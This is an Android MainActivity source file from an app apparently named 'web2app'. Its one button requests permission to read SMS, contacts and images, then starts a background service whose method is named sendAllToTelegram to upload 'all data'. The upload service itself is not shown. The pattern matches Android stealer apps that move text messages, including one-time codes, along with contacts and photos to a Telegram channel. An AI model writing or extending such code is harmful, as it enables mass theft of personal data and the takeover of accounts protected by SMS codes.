package com.csu.web2app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";

    private enum ExportType { ALL }
    private ExportType pendingExportType;

    private final ActivityResultLauncher<String[]> requestMultiplePermissionsLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
                boolean allGranted = true;
                for (Map.Entry<String, Boolean> entry : result.entrySet()) {
                    if (!entry.getValue()) {
                        allGranted = false;
                        break;
                    }
                }

                if (allGranted) {
                    if (pendingExportType == ExportType.ALL) {
                        sendAllToTelegram();
                    }
                } else {
                    Toast.makeText(this, "Permissions denied. Some features may not work.", Toast.LENGTH_SHORT).show();
                }
            });

    private final ActivityResultLauncher<String> requestNotificationPermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -> {
                if (isGranted) {
                    if (pendingExportType == ExportType.ALL) {
                        sendAllToTelegram();
                    }
                } else {
                    Toast.makeText(this, "Notification permission denied. Background upload might not work correctly.", Toast.LENGTH_SHORT).show();
                }
            });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnSendAll = findViewById(R.id.btn_send_all);
        btnSendAll.setOnClickListener(v -> {
            pendingExportType = ExportType.ALL;
            String imagePermission = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
                    Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE;

            List<String> permissionsList = new ArrayList<>();
            permissionsList.add(Manifest.permission.READ_SMS);
            permissionsList.add(Manifest.permission.READ_CONTACTS);
            permissionsList.add(imagePermission);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissionsList.add(Manifest.permission.POST_NOTIFICATIONS);
            }

            String[] permissions = permissionsList.toArray(new String[0]);

            boolean allGranted = true;
            for (String p : permissions) {
                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                sendAllToTelegram();
            } else {
                requestMultiplePermissionsLauncher.launch(permissions);
            }
        });
    }

    private void sendAllToTelegram() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                pendingExportType = ExportType.ALL;
                requestNotificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS);
                return;
            }
        }

        findViewById(R.id.btn_send_all).setVisibility(View.GONE);
        findViewById(R.id.loader).setVisibility(View.VISIBLE);

        Intent intent = new Intent(this, UploadService.class);
        intent.setAction(UploadService.ACTION_UPLOAD_ALL);
        ContextCompat.startForegroundService(this, intent);
        Toast.makeText(this, "Started background upload of all data", Toast.LENGTH_SHORT).show();
    }
}
